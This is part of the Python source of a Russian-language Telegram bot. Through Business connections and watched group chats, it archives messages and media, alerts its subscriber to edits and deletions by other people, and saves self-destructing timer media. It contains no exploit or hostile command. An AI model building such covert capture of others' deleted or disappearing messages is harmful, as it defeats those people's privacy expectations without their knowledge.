        photo = max(
            message["photo"],
            key=lambda item: (
                item.get("file_size") or 0,
                item.get("width") or 0,
                item.get("height") or 0,
            ),
        )
        return media_payload("photo", photo, message)

    for media_type in ("video", "animation", "document", "voice", "audio", "video_note", "sticker"):
        value = message.get(media_type)
        if isinstance(value, dict) and value.get("file_id"):
            return media_payload(media_type, value, message)

    return None


def media_ttl_seconds(message: dict, value: dict | None = None) -> int | None:
    """Read timer fields from Bot API payloads, including nested media objects."""
    candidates = []
    if isinstance(value, dict):
        candidates.extend([value.get("ttl_seconds"), value.get("ttl_period")])

    def walk(node: object) -> None:
        if isinstance(node, dict):
            candidates.extend([node.get("ttl_seconds"), node.get("ttl_period")])
            for child in node.values():
                walk(child)
        elif isinstance(node, list):
            for child in node:
                walk(child)

    walk(message)
    for candidate in candidates:
        try:
            ttl = int(candidate)
        except (TypeError, ValueError):
            continue
        if ttl > 0:
            return ttl
    return None


def media_payload(media_type: str, value: dict, message: dict) -> dict:
    ttl_seconds = media_ttl_seconds(message, value)
    return {
        "type": media_type,
        "file_id": value.get("file_id"),
        "file_unique_id": value.get("file_unique_id"),
        "file_name": value.get("file_name"),
        "mime_type": value.get("mime_type"),
        "file_size": value.get("file_size"),
        "width": value.get("width"),
        "height": value.get("height"),
        "duration": value.get("duration"),
        "ttl_seconds": int(ttl_seconds) if ttl_seconds else None,
        "has_media_spoiler": 1 if message.get("has_media_spoiler") else 0,
    }


def safe_part(value: object, fallback: str = "x") -> str:
    text = re.sub(r"[^A-Za-z0-9_.-]+", "_", str(value or fallback)).strip("._")
    return text[:80] or fallback


def archive_media_file(context: str, chat_id: int, message_id: int, media: dict | None) -> str | None:
    if not media or not media.get("file_id"):
        return None

    file_id = str(media["file_id"])
    declared_size = media.get("file_size") or 0
    try:
        declared_size = int(declared_size)
    except (TypeError, ValueError):
        declared_size = 0

    # Telegram Bot API getFile has a 20 MB download ceiling. This is an
    # expected limitation, not a technical failure. Keep file_id in the DB so
    # Telegram can still resend the media when possible.
    getfile_limit = min(MAX_MEDIA_ARCHIVE_BYTES, 20 * 1024 * 1024)
    if declared_size and declared_size > getfile_limit:
        log(
            "Media skipped before getFile by size: "
            f"{media.get('type')} {chat_id}/{message_id}, {declared_size} bytes, limit {getfile_limit}"
        )
        return None

    try:
        file_info = telegram_call("getFile", {"file_id": file_id}, timeout=30)
    except TelegramApiError as exc:
        if "file is too big" in str(exc).lower():
            log(f"getFile skipped for oversized media {media.get('type')} {chat_id}/{message_id}")
            return None
        log(f"getFile failed for {media.get('type')} {chat_id}/{message_id}: {exc}")
        report_technical_issue("media_getfile", f"Не удалось получить файл Telegram: {exc}")
        return None

    file_path = file_info.get("file_path")
    if not file_path:
        return None

    file_size = file_info.get("file_size") or declared_size or 0
    if file_size and int(file_size) > MAX_MEDIA_ARCHIVE_BYTES:
        log(
            "Media skipped by size: "
            f"{media.get('type')} {chat_id}/{message_id}, {file_size} bytes, limit {MAX_MEDIA_ARCHIVE_BYTES}"
        )
        return None

    suffix = Path(file_path).suffix
    if not suffix and media.get("mime_type"):
        suffix = mimetypes.guess_extension(str(media["mime_type"])) or ""
    if not suffix:
        suffix = ".bin"

    filename = "_".join(
        [
            str(int(time.time())),
            safe_part(context),
            safe_part(chat_id),
            safe_part(message_id),
            safe_part(media.get("type")),
            safe_part(media.get("file_unique_id") or file_id[-12:]),
        ]
    ) + suffix
    dest = MEDIA_DIR / filename
    url = FILE_API_URL + quote(file_path, safe="/")

    try:
        with urlopen(Request(url), timeout=120) as response, dest.open("wb") as output:
            while True:
                chunk = response.read(1024 * 256)
                if not chunk:
                    break
                output.write(chunk)
    except Exception as exc:
        log(f"Media download failed for {media.get('type')} {chat_id}/{message_id}: {exc}")
        report_technical_issue("media_download", f"Не удалось сохранить медиа: {type(exc).__name__}: {exc}")
        try:
            dest.unlink(missing_ok=True)
        except Exception:
            pass
        return None

    log(f"Media archived: {media.get('type')} {chat_id}/{message_id} -> {dest.name}")
    return str(dest)


def save_message(context: str, message: dict) -> dict:
    chat_id = int(message["chat"]["id"])
    message_id = int(message["message_id"])
    user = message.get("from") or {}
    chat = message.get("chat") or {}
    user_id = user.get("id") or (chat.get("id") if chat.get("type") == "private" else None)
    author = message_author(message)
    content = message_content(message)
    media = message_media(message)
    reply = message.get("reply_to_message") or {}
    reply_to_message_id = int(reply["message_id"]) if reply.get("message_id") else None
    reply_to_author = message_author(reply) if reply_to_message_id else None
    reply_to_content = message_content(reply) if reply_to_message_id else None
    local_media_path = archive_media_file(context, chat_id, message_id, media)
    now = int(time.time())

    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO messages (
                context, chat_id, message_id, user_id, author, content,
                media_type, media_file_id, media_unique_id, media_json, local_media_path,
                has_media_spoiler, ttl_seconds, reply_to_message_id, reply_to_author, reply_to_content,
                created_at, updated_at, deleted_at
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NULL)
            ON CONFLICT(context, chat_id, message_id) DO UPDATE SET
                user_id = excluded.user_id,
                author = excluded.author,
                content = excluded.content,
                media_type = COALESCE(excluded.media_type, messages.media_type),
                media_file_id = COALESCE(excluded.media_file_id, messages.media_file_id),
                media_unique_id = COALESCE(excluded.media_unique_id, messages.media_unique_id),
                media_json = COALESCE(excluded.media_json, messages.media_json),
                local_media_path = COALESCE(excluded.local_media_path, messages.local_media_path),
                has_media_spoiler = excluded.has_media_spoiler,
                ttl_seconds = COALESCE(excluded.ttl_seconds, messages.ttl_seconds),
                reply_to_message_id = COALESCE(excluded.reply_to_message_id, messages.reply_to_message_id),
                reply_to_author = COALESCE(excluded.reply_to_author, messages.reply_to_author),
                reply_to_content = COALESCE(excluded.reply_to_content, messages.reply_to_content),
                updated_at = excluded.updated_at,
                deleted_at = NULL
            """,
            (
                context,
                chat_id,
                message_id,
                user_id,
                author,
                content,
                media["type"] if media else None,
                media["file_id"] if media else None,
                media["file_unique_id"] if media else None,
                json.dumps(media, ensure_ascii=False) if media else None,
                local_media_path,
                1 if message.get("has_media_spoiler") else 0,
                media.get("ttl_seconds") if media else None,
                reply_to_message_id,
                reply_to_author,
                reply_to_content,
                now,
                now,
            ),
        )

    saved = get_saved_message(context, chat_id, message_id)
    return saved or {
        "user_id": user_id,
        "author": author,
        "content": content,
        "media_type": media["type"] if media else None,
        "media_file_id": media["file_id"] if media else None,
        "media_unique_id": media["file_unique_id"] if media else None,
        "media_json": json.dumps(media, ensure_ascii=False) if media else None,
        "local_media_path": local_media_path,
        "has_media_spoiler": 1 if message.get("has_media_spoiler") else 0,
        "ttl_seconds": media.get("ttl_seconds") if media else None,
        "reply_to_message_id": reply_to_message_id,
        "reply_to_author": reply_to_author,
        "reply_to_content": reply_to_content,
        "deleted_at": None,
    }


def get_saved_message(context: str, chat_id: int, message_id: int) -> dict | None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        row = conn.execute(
            """
            SELECT
                user_id, author, content,
                media_type, media_file_id, media_unique_id, media_json, local_media_path,
                has_media_spoiler, ttl_seconds, reply_to_message_id, reply_to_author, reply_to_content, deleted_at
            FROM messages
            WHERE context = ? AND chat_id = ? AND message_id = ?
            """,
            (context, chat_id, message_id),
        ).fetchone()
    return dict(row) if row else None


def mark_message_deleted(context: str, chat_id: int, message_id: int) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "UPDATE messages SET deleted_at = ? WHERE context = ? AND chat_id = ? AND message_id = ?",
            (int(time.time()), context, chat_id, message_id),
        )


def send_saved_media(chat_id: int, saved_message: dict) -> bool:
    media_type = saved_message.get("media_type")
    if not media_type:
        return False

    sender = MEDIA_SENDERS.get(media_type)
    if not sender:
        return False
    method, field = sender

    local_path_value = saved_message.get("local_media_path")
    if local_path_value:
        local_path = Path(str(local_path_value))
        if local_path.exists():
            fields: dict[str, object] = {"chat_id": chat_id}
            if media_type in {"photo", "video", "animation"} and saved_message.get("has_media_spoiler"):
                fields["has_spoiler"] = True
            if media_type == "video":
                fields["supports_streaming"] = True
            try:
                telegram_multipart_call(method, fields, {field: local_path})
                move_menu_to_bottom(chat_id)
                return True
            except TelegramApiError as exc:
                log(f"{method} local failed for {chat_id}: {exc}")

    file_id = saved_message.get("media_file_id")
    if not file_id:
        return False

    payload: dict[str, object] = {"chat_id": chat_id, field: file_id}
    if media_type in {"photo", "video", "animation"} and saved_message.get("has_media_spoiler"):
        payload["has_spoiler"] = True
    if media_type == "video":
        payload["supports_streaming"] = True

    try:
        telegram_call(method, payload)
        move_menu_to_bottom(chat_id)
        return True
    except TelegramApiError as exc:
        log(f"{method} file_id failed for {chat_id}: {exc}")
        move_menu_to_bottom(chat_id)
        return False


def command_from_message(message: dict) -> tuple[str, list[str]] | None:
    text = message.get("text") or ""
    if not text.startswith("/"):
        return None

    parts = text.strip().split()
    raw_command = parts[0][1:]
    command_name, _separator, mention = raw_command.partition("@")
    if mention and BOT_USERNAME and mention.lower() != BOT_USERNAME.lower():
        return None

    return "/" + command_name.lower(), parts[1:]


def is_private_chat(message: dict) -> bool:
    return (message.get("chat") or {}).get("type") == "private"


def is_chat_admin(chat_id: int, user_id: int) -> bool:
    try:
        member = telegram_call("getChatMember", {"chat_id": chat_id, "user_id": user_id})
    except TelegramApiError as exc:
        log(f"getChatMember failed for chat {chat_id}: {exc}")
        return False
    return member.get("status") in {"creator", "administrator"}


def handle_start(message: dict, args: list[str] | None = None) -> None:
    user = message.get("from") or {}
    user_id = int(user["id"])
    chat_id = int(message["chat"]["id"])
    new_user = not user_exists(user_id)
    register_user(user_id, chat_id if is_private_chat(message) else None, user)

    # приход по реферальной ссылке: /start ref_<id>
    args = args or []
    if args and args[0].startswith("ref_"):
        try:
            referrer_id = int(args[0][4:])
        except ValueError:
            referrer_id = 0
        if referrer_id and referrer_id != user_id and new_user and user_exists(referrer_id):
            if add_referral(referrer_id, user_id):
                check_trial(referrer_id)

    if args and args[0].startswith("gift_") and is_private_chat(message):
        try:
            gift_target = int(args[0][5:])
        except ValueError:
            gift_target = 0
        if gift_target and user_exists(gift_target):
            text, markup = page_gift_buy(user_id, gift_target)
            send_menu_page(user_id, chat_id, text, markup)
            return

    if is_private_chat(message):
        text, markup = page_home(user_id)
        send_menu_page(user_id, chat_id, text, markup, use_photo=True)
    else:
        send_message(
            chat_id,
            f"{pe('home')} Меню, подписка и помощь — в личных сообщениях со мной.\n"
            f"Этот чат подключить можно командой /watch.",
            parse_mode="HTML",
        )


def handle_watch(message: dict) -> None:
    user = message.get("from") or {}
    user_id = int(user["id"])
    chat_id = int(message["chat"]["id"])
    register_user(user_id, chat_id if is_private_chat(message) else None, user)

    if not is_private_chat(message) and not is_chat_admin(chat_id, user_id):
        send_message(chat_id, "Команду /watch может включить только администратор чата.")
        return

    set_chat_owner(chat_id, user_id)
    send_message(chat_id, "Логирование для этого чата включено.")


def handle_status(message: dict) -> None:
    chat_id = int(message["chat"]["id"])
    if get_chat_owner(chat_id):
        send_message(chat_id, "Логирование для этого обычного чата включено.")
    else:
        send_message(chat_id, "Обычный чат не подключен. Для Business-чатов смотри статус подключения в настройках Telegram Business.")


def handle_stop(message: dict, args: list[str]) -> None:
    user = message.get("from") or {}
    user_id = int(user["id"])
    chat_id = int(message["chat"]["id"])

    if is_private_chat(message):
        if args:
            try:
                target_chat_id = int(args[0])
            except ValueError:
                send_message(chat_id, "Укажи корректный ID чата. Например: /stop -1001234567890")
                return
            if get_chat_owner(target_chat_id) != user_id:
                send_message(chat_id, "Этот чат не подключен к твоему аккаунту.")
                return
            remove_chat_owner(target_chat_id)
            send_message(chat_id, f"Логирование чата {target_chat_id} отключено.")
            return

        chats = get_user_chats(user_id)
        for watched_chat_id in chats:
            remove_chat_owner(watched_chat_id)
        send_message(chat_id, f"Логирование отключено для всех твоих обычных чатов: {len(chats)}.")
        return

    if get_chat_owner(chat_id) != user_id:
        send_message(chat_id, "Отключить логирование может только тот, кто включил /watch.")
        return

    remove_chat_owner(chat_id)
    send_message(chat_id, "Логирование этого чата отключено.")


def handle_list(message: dict) -> None:
    user_id = int(message["from"]["id"])
    chat_id = int(message["chat"]["id"])
    chats = get_user_chats(user_id)
    if not chats:
        send_message(chat_id, "У тебя нет подключенных обычных чатов.")
        return

    lines = [f"ID: {watched_chat_id}" for watched_chat_id in chats]
    send_message(chat_id, "Подключенные обычные чаты:\n" + "\n".join(lines))


def format_connection_lines(rows: list[dict]) -> list[str]:
    lines = []
    for index, row in enumerate(rows, start=1):
        status = "✅ защита включена" if row.get("is_enabled") else "⏸ защита приостановлена"
        lines.append(f"{index}. {status}")
    return lines


def handle_connections(message: dict) -> None:
    user = message.get("from") or {}
    user_id = int(user["id"])
    chat_id = int(message["chat"]["id"])
    rows = list_business_connections(user_id)
    if not rows:
        send_message(chat_id, "У тебя пока нет подключённых чатов. Открой раздел «Как это работает», чтобы подключить их.")
        return
    send_message(chat_id, "Подключение чатов:\n" + "\n".join(format_connection_lines(rows)))

def handle_restore(message: dict, restore_all: bool = False) -> None:
    user = message.get("from") or {}
    user_id = int(user["id"])
    chat_id = int(message["chat"]["id"])
    restored = restore_business_connections(user_id)
    rows = list_business_connections(user_id)
    if restored:
        send_message(
            chat_id,
            f"✅ Защита снова включена для подключений: {len(restored)}.\n\n"
            + "\n".join(format_connection_lines(rows))
            + "\n\nЕсли бот выключен в настройках Telegram Business, включи его там вручную.",
        )
    else:
        send_message(
            chat_id,
            "Выключенных подключений не нашёл.\n\n"
            + ("\n".join(format_connection_lines(rows)) if rows else "Подключений пока нет."),
        )

def should_forward_media_immediately(saved_message: dict) -> bool:
    if not saved_message.get("media_type"):
        return False
    if FORWARD_ALL_BUSINESS_MEDIA:
        return True
    return FORWARD_TIMER_MEDIA and bool(saved_message.get("ttl_seconds"))


def send_immediate_timer_media(notify_chat_id: int, saved_message: dict) -> None:
    send_message(
        notify_chat_id,
        media_notification_html(
            saved_message.get("author") or "Неизвестный пользователь",
            saved_message.get("content") or "",
            saved_message.get("media_type") or "media",
            saved_message.get("ttl_seconds"),
        ),
        parse_mode="HTML",
    )
    if not send_saved_media(notify_chat_id, saved_message):
        send_message(notify_chat_id, "Медиа было найдено, но Telegram не дал повторно отправить файл.")


def send_immediate_reply_media(notify_chat_id: int, saved_message: dict) -> None:
    send_message(
        notify_chat_id,
        media_notification_html(
            saved_message.get("author") or "Неизвестный пользователь",
            saved_message.get("content") or "",
            saved_message.get("media_type") or "media",
            saved_message.get("ttl_seconds"),
            source="reply",
        ),
        parse_mode="HTML",
    )
    if not send_saved_media(notify_chat_id, saved_message):
        send_message(notify_chat_id, "Медиа из ответа было найдено, но Telegram не дал повторно отправить файл.")


def handle_reply_to_message_media(
    context: str,
    message: dict,
    notify_chat_id: int | None,
    ignored_user_id: int | None = None,
) -> None:
    reply = message.get("reply_to_message")
    if not isinstance(reply, dict) or not notify_chat_id:
        return
    if message_is_from_user(reply, ignored_user_id):
        return
    reply_media = message_media(reply)
    if not reply_media or reply_media.get("type") not in IMMEDIATE_REPLY_MEDIA_TYPES:
        return

    try:
        reply_chat_id = int(reply["chat"]["id"])
        reply_message_id = int(reply["message_id"])
    except (KeyError, TypeError, ValueError):
        return

    old = get_saved_message(context, reply_chat_id, reply_message_id)
    saved = save_message(context, reply)

    already_forwarded = bool(old and (old.get("local_media_path") or old.get("media_file_id")))
    if not already_forwarded:
        send_immediate_reply_media(notify_chat_id, saved)


def handle_regular_message(message: dict) -> None:
    if message.get("successful_payment"):
        handle_successful_payment(message)
        return

    text = message.get("text") or ""
    user_id = int((message.get("from") or {}).get("id") or 0)
    chat_id = int(message["chat"]["id"])

    if is_private_chat(message):
        register_user(user_id, chat_id, message.get("from") or {})
        if is_blocked(user_id):
            send_message(chat_id, "Доступ к боту заблокирован администратором.")
            return

    pending_maps = (
        PENDING_GRANT, PENDING_PRICE, PENDING_BROADCAST, PENDING_PROMO_CREATE,
        PENDING_PROMO_ACTIVATE, PENDING_GIFT, PENDING_SUPPORT, PENDING_SUPPORT_REPLY,
        PENDING_BLOCK_REASON, PENDING_ADMIN_ADD,
    )
    if text.strip() == "/cancel" and any(chat_id in pending for pending in pending_maps):
        for pending in pending_maps:
            pending.pop(chat_id, None)
        BROADCAST_PREVIEWS.pop(chat_id, None)
        send_message(chat_id, "Отменено.")
        return

    # ответ админа на выдачу подписки («ID дней») — до разбора команд
    if text and not text.startswith("/") and chat_id in PENDING_ADMIN_ADD and is_owner_admin(user_id):
        deadline = PENDING_ADMIN_ADD.pop(chat_id, 0)
        if deadline < time.time():
            send_message(chat_id, "Время добавления администратора истекло.")
            return
        try:
            target_id = int(text.strip())
        except ValueError:
            send_message(chat_id, "Нужен Telegram ID числом.")
            return
        ok, result = add_bot_admin(user_id, target_id)
        send_message(chat_id, result)
        return

    if text and not text.startswith("/") and chat_id in PENDING_SUPPORT_REPLY and is_admin_user(user_id):
        if handle_support_reply_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_BLOCK_REASON and is_admin_user(user_id):
        if handle_block_reason_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_BROADCAST and is_admin_user(user_id):
        if handle_broadcast_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_PROMO_CREATE and is_admin_user(user_id):
        if handle_promo_create_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_PRICE and is_admin_user(user_id):
        if handle_price_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_GRANT and is_admin_user(user_id):
        if handle_grant_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_PROMO_ACTIVATE:
        if handle_promo_activate_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_GIFT:
        if handle_gift_input(user_id, chat_id, text):
            return
    if text and not text.startswith("/") and chat_id in PENDING_SUPPORT:
        if handle_support_input(user_id, chat_id, text):
            return

    command = command_from_message(message)
    if command:
        name, args = command
        if name == "/start":
            handle_start(message, args)
        elif name == "/menu":
            handle_start(message, [])
        elif name == "/help":
            if is_private_chat(message):
                page_text, page_markup = page_help(user_id)
                send_menu_page(user_id, chat_id, page_text, page_markup)
            else:
                send_message(chat_id, "Помощь покажу в личных сообщениях со мной.")
        elif name == "/support" and is_private_chat(message):
            PENDING_SUPPORT[chat_id] = time.time() + 600
            send_message(chat_id, "Напиши вопрос одним сообщением. Отмена — /cancel")
        elif name == "/gift" and is_private_chat(message):
            PENDING_GIFT[chat_id] = time.time() + 300
            send_message(chat_id, "Отправь Telegram ID или @username получателя. Отмена — /cancel")
        elif name == "/promo" and is_private_chat(message):
            if args:
                _, result = activate_promo(user_id, args[0])
                send_message(chat_id, result)
            else:
                PENDING_PROMO_ACTIVATE[chat_id] = time.time() + 300
                send_message(chat_id, "Отправь промокод одним сообщением. Отмена — /cancel")
        elif name == "/sub":
            handle_sub_command(message, args)
        elif name == "/admins" and is_private_chat(message):
            page_text, page_markup = page_admins(user_id)
            send_menu_page(user_id, chat_id, page_text, page_markup)
        elif name == "/admin_add" and is_private_chat(message):
            if not is_owner_admin(user_id):
                deny_admin_command(chat_id)
            elif args:
                try:
                    target_id = int(args[0])
                except ValueError:
                    send_message(chat_id, "Формат: /admin_add ID")
                else:
                    _, result = add_bot_admin(user_id, target_id)
                    send_message(chat_id, result)
            else:
                PENDING_ADMIN_ADD[chat_id] = time.time() + 300
                send_message(chat_id, "Отправь Telegram ID нового администратора. Отмена — /cancel")
        elif name == "/admin_del" and is_private_chat(message):
            if not is_owner_admin(user_id):
                deny_admin_command(chat_id)
            elif not args:
                send_message(chat_id, "Формат: /admin_del ID")
            else:
                try:
                    target_id = int(args[0])
                except ValueError:
                    send_message(chat_id, "Формат: /admin_del ID")
                else:
                    _, result = remove_bot_admin(user_id, target_id)
                    send_message(chat_id, result)
        elif name == "/watch":
            handle_watch(message)
        elif name == "/status":
            handle_status(message)
        elif name == "/list":
            handle_list(message)
        elif name == "/stop":
            handle_stop(message, args)
        elif name == "/connections":
            handle_connections(message)
        elif name in {"/restore", "/enable"}:
            handle_restore(message, restore_all=False)
        elif name in {"/restore_all", "/enable_all"}:
            send_message(chat_id, "Эта команда больше не используется. Для своих подключений: /restore")
        return

    owner_id = get_chat_owner(chat_id)
    if not owner_id:
        return

    saved = save_message("regular", message)
    if saved_message_is_from_user(saved, owner_id):
        return
    if not owner_can_log(owner_id):
        return

    notify_chat_id = get_private_chat_id(owner_id)
    handle_reply_to_message_media("regular", message, notify_chat_id, ignored_user_id=owner_id)
    if should_forward_media_immediately(saved):
        send_immediate_timer_media(notify_chat_id, saved)


def handle_edited_regular_message(message: dict) -> None:
    chat_id = int(message["chat"]["id"])
    owner_id = get_chat_owner(chat_id)
    if not owner_id:
        return

    old = get_saved_message("regular", chat_id, int(message["message_id"]))
    save_message("regular", message)
    if not old:
        return
    if saved_message_is_from_user(old, owner_id):
        return
    if not owner_can_log(owner_id):
        return

    notify_chat_id = get_private_chat_id(owner_id)
    send_message(
        notify_chat_id,
        edited_notification_html(old["author"], old["content"], message_content(message)),
        parse_mode="HTML",
    )
    send_saved_media(notify_chat_id, old)


def handle_business_connection(connection: dict) -> None:
    raw_log("business_connection", connection)
    save_business_connection(connection)
    owner_id = (connection.get("user") or {}).get("id")
    notify_chat_id = connection.get("user_chat_id") or owner_id
    if not notify_chat_id:
        return

    if connection.get("is_enabled", True):
        sub_note = status_line(int(owner_id)) if owner_id else "—"
        send_message(
            int(notify_chat_id),
            f"{pe('check')} <b>Telegram Business подключен.</b>\n\n"
            f"Теперь всё удалённое и исправленное в выбранных чатах прилетает сюда.\n"
            f"Медиа сохраняется в локальный архив, если Telegram отдаёт файл через Bot API.\n"
            f"{pe('stars')} Подписка: {sub_note}",
            parse_mode="HTML",
        )
        if owner_id and not sub_active(int(owner_id)):
            text, markup = page_buy(int(owner_id))
            send_message(
                int(notify_chat_id),
                f"{pe('warning')} Уведомления пойдут сразу, как активировать подписку:\n\n{text}",
                parse_mode="HTML",
                reply_markup=markup,
            )
    else:
        send_message(int(notify_chat_id), "Telegram Business отключен для этого бота.")


def apply_business_message_style(message: dict, owner_id: int | None) -> str | None:
    if owner_id is None or message.get("sender_business_bot") or not message_is_from_user(message, owner_id):
        return None
    field = "text" if message.get("text") is not None else "caption" if message.get("caption") is not None else ""
    if not field:
        return None
    original = str(message[field])
    transformed = transform_message_style(owner_id, original, 4096 if field == "text" else 1024)
    if transformed == original:
        return original
    payload = {
        "business_connection_id": message["business_connection_id"],
        "chat_id": int(message["chat"]["id"]),
        "message_id": int(message["message_id"]),
        field: transformed,
    }
    try:
        telegram_call("editMessageText" if field == "text" else "editMessageCaption", payload)
    except TelegramApiError as exc:
        log(f"Business style edit failed for {owner_id}: {exc}")
        return original
    return transformed


def handle_business_message(message: dict) -> None:
    raw_log("business_message", message)
    connection_id = message.get("business_connection_id")
    if not connection_id:
        return

    context = f"business:{connection_id}"
    notify_chat_id = get_business_notify_chat_id(connection_id)
    owner_id = get_business_owner_id(connection_id)
    apply_business_message_style(message, owner_id)
    saved = save_message(context, message)
    if saved_message_is_from_user(saved, owner_id):
        return
    if not owner_can_log(owner_id):
        return
    handle_reply_to_message_media(context, message, notify_chat_id, ignored_user_id=owner_id)
    if notify_chat_id and should_forward_media_immediately(saved):
        send_immediate_timer_media(notify_chat_id, saved)


def handle_edited_business_message(message: dict) -> None:
    raw_log("edited_business_message", message)
    connection_id = message.get("business_connection_id")
    if not connection_id:
        return

    context = f"business:{connection_id}"
    chat_id = int(message["chat"]["id"])
    message_id = int(message["message_id"])
    old = get_saved_message(context, chat_id, message_id)
    save_message(context, message)
    if not old:
        return

    notify_chat_id = get_business_notify_chat_id(connection_id)
    if not notify_chat_id:
        return
    owner_id = get_business_owner_id(connection_id)
    if saved_message_is_from_user(old, owner_id):
        return
    if not owner_can_log(owner_id):
        return

    send_message(
        notify_chat_id,
        edited_notification_html(old["author"], old["content"], message_content(message)),
        parse_mode="HTML",
    )
    send_saved_media(notify_chat_id, old)


def handle_deleted_business_messages(deleted: dict) -> None:
    raw_log("deleted_business_messages", deleted)
    connection_id = deleted.get("business_connection_id")
    chat = deleted.get("chat") or {}
    chat_id = chat.get("id")
    message_ids = deleted.get("message_ids") or []
    if not connection_id or chat_id is None:
        return

    notify_chat_id = get_business_notify_chat_id(connection_id)
    if not notify_chat_id:
        return

    context = f"business:{connection_id}"
    chat_info = format_chat(chat)
    owner_id = get_business_owner_id(connection_id)
    if not owner_can_log(owner_id):
        # подписки нет — данные всё равно помечаем, уведомления не шлём
        for message_id in message_ids:
            mark_message_deleted(context, int(chat_id), int(message_id))
        return
    for message_id in message_ids:
        old = get_saved_message(context, int(chat_id), int(message_id))
        if old:
            if saved_message_is_from_user(old, owner_id):
                mark_message_deleted(context, int(chat_id), int(message_id))
                continue
            send_message(
                notify_chat_id,
                deleted_notification_html(
                    old["author"],
                    old["content"],
                    chat_info=chat_info,
                    user_id=old.get("user_id"),
                ),
                parse_mode="HTML",
            )
            if old.get("media_type"):
                if not send_saved_media(notify_chat_id, old):
                    send_message(
                        notify_chat_id,
                        f"Медиа было найдено ({old.get('media_type')}), но Telegram не дал повторно отправить файл.",
                    )
            mark_message_deleted(context, int(chat_id), int(message_id))
        else:
            send_message(
                notify_chat_id,
                unknown_deleted_notification_html(int(message_id), chat_info=chat_info),
                parse_mode="HTML",
            )


def handle_update(update: dict) -> None:
    if "message" in update:
        handle_regular_message(update["message"])
    elif "edited_message" in update:
        handle_edited_regular_message(update["edited_message"])
    elif "callback_query" in update:
        handle_callback_query(update["callback_query"])
    elif "pre_checkout_query" in update:
        handle_pre_checkout_query(update["pre_checkout_query"])
    elif "business_connection" in update:
        handle_business_connection(update["business_connection"])
    elif "business_message" in update:
        handle_business_message(update["business_message"])
    elif "edited_business_message" in update:
        handle_edited_business_message(update["edited_business_message"])
    elif "deleted_business_messages" in update:
        handle_deleted_business_messages(update["deleted_business_messages"])


def configure_bot() -> None:
    user_commands = [
        {"command": "start", "description": "Главное меню"},
        {"command": "menu", "description": "Открыть меню"},
        {"command": "help", "description": "Как подключить бота"},
        {"command": "support", "description": "Написать в поддержку"},
        {"command": "gift", "description": "Подарить подписку"},
        {"command": "promo", "description": "Активировать промокод"},
        {"command": "watch", "description": "Включить обычный чат"},
        {"command": "status", "description": "Статус обычного чата"},
        {"command": "list", "description": "Список обычных чатов"},
        {"command": "stop", "description": "Отключить обычные чаты"},
        {"command": "connections", "description": "Мои Business-подключения"},
        {"command": "restore", "description": "Включить свои Business-подключения"},
    ]
    try:
        telegram_call("setMyCommands", {"commands": user_commands})
    except TelegramApiError as exc:
        log(f"setMyCommands failed: {exc}")

    for admin_id in list_admin_ids():
        admin_commands = list(user_commands) + [
            {"command": "sub", "description": "Выдать подписку"},
            {"command": "admins", "description": "Администраторы"},
        ]
        if is_owner_admin(admin_id):
            admin_commands.extend(
                [
                    {"command": "admin_add", "description": "Выдать админку"},
                    {"command": "admin_del", "description": "Снять админку"},
                ]
            )
        try:
            telegram_call(
                "setMyCommands",
                {
                    "commands": admin_commands,
                    "scope": {"type": "chat", "chat_id": admin_id},
                },
            )
        except TelegramApiError as exc:
            log(f"setMyCommands admin scope failed for {admin_id}: {exc}")

def run_polling() -> None:
    global POLLING_ERROR_COUNT
    init_db()
    telegram_call("deleteWebhook", {"drop_pending_updates": False})
    configure_bot()
    me = telegram_call("getMe")
    log(f"Bot @{me.get('username')} started. Waiting for updates.")

    offset = None
    while True:
        try:
            updates = telegram_call(
                "getUpdates",
                {
                    "offset": offset,
                    "timeout": 50,
                    "allowed_updates": ALLOWED_UPDATES,
                },
                timeout=60,
            )
            if POLLING_ERROR_COUNT:
                for admin_id in sorted(ADMIN_USER_IDS):
                    send_message(admin_id, f"{pe('check')} Telegram API снова работает после ошибок: {POLLING_ERROR_COUNT}.", parse_mode="HTML")
                POLLING_ERROR_COUNT = 0
            for update in updates:
                offset = int(update["update_id"]) + 1
                try:
                    handle_update(update)
                except Exception as exc:
                    log(f"Update handling failed: {type(exc).__name__}: {exc}")
                    report_technical_issue("update", f"Ошибка обработки обновления: {type(exc).__name__}: {exc}")
            run_maintenance()
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            POLLING_ERROR_COUNT += 1
            log(f"Polling failed: {type(exc).__name__}: {exc}")
            time.sleep(5)


if __name__ == "__main__":
    lock_handle = None
    try:
        lock_handle = acquire_single_instance_lock()
        run_polling()
    except KeyboardInterrupt:
        log("Stopped.")
    except RuntimeError as exc:
        log(str(exc))
        raise SystemExit(1) from None
    finally:
        if lock_handle is not None:
            release_single_instance_lock(lock_handle)
